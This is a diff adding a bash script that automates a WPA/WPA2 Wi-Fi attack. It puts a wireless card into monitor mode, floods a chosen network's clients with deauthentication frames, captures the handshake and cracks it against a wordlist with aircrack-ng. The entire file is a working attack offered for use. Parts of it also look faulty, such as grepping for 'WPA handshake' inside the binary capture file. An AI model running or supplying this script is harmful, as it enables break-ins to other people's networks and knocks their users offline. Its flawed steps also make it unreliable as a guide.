@@ -1,0 +1,49 @@
+#!/bin/bash
+
+# Set the wireless interface
+INTERFACE="wlan0"
+
+# Put the wireless interface into monitor mode
+airmon-ng check kill
+airmon-ng start $INTERFACE
+
+# Prompt user for the target network BSSID
+read -p "Enter the BSSID of the target network: " BSSID
+
+# Search for available networks with the specified BSSID
+echo "Searching for available networks with BSSID $BSSID..."
+airodump-ng --bssid $BSSID --output-format csv -w networks $INTERFACE &
+PID=$!
+
+# Prompt user for the target network ESSID
+echo "Please select the ESSID of the target network from the list below:"
+grep -oP "(?<=,)[\w-]+(?=,)" networks-01.csv | sed '1d;$d' | uniq
+read -p "Enter the ESSID of the target network: " ESSID
+
+# Capture the WPA/WPA2 handshake and deauthenticate clients
+echo "Capturing the WPA/WPA2 handshake..."
+airodump-ng --bssid $BSSID --essid $ESSID -w capture $INTERFACE &
+PID=$!
+sleep 5
+aireplay-ng --deauth 50 -a $BSSID $INTERFACE &
+
+# Wait for the handshake to be captured
+echo "Waiting for handshake..."
+while true; do
+  if grep -q "WPA handshake" capture-01.cap; then
+    echo "Handshake captured!"
+    kill $PID
+    break
+  fi
+  sleep 5
+done
+
+# Prompt user for the path to the wordlist
+read -p "Enter the path to the wordlist: " WORDLIST
+
+# Use aircrack-ng to crack the handshake
+aircrack-ng -w $WORDLIST capture-01.cap
+
+# Stop the monitor mode and restore the wireless interface
+airmon-ng stop $INTERFACE
+service network-manager start
